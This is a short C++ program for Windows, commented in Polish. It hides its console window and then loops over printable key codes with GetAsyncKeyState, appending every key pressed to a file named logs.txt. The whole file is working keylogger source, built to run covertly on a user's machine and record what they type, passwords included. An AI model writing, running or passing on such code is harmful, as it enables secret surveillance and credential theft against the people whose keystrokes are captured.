#include <Windows.h>
#include <fstream>
#include <iostream>

int main()
{
    // Tutaj ukrywamy okno konsoli ;)
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    std::fstream file;

    while (true)
    {
        for (int sign = 32; sign <= 126; sign++)
            if (GetAsyncKeyState(sign) == -32767)
            {
                // tworzymy plik logs.txt w którym przechowywane będa nacisniete klawisze
                file.open("logs.txt", std::fstream::app);
                file << (char)sign;
                file.close();
            }
    }
}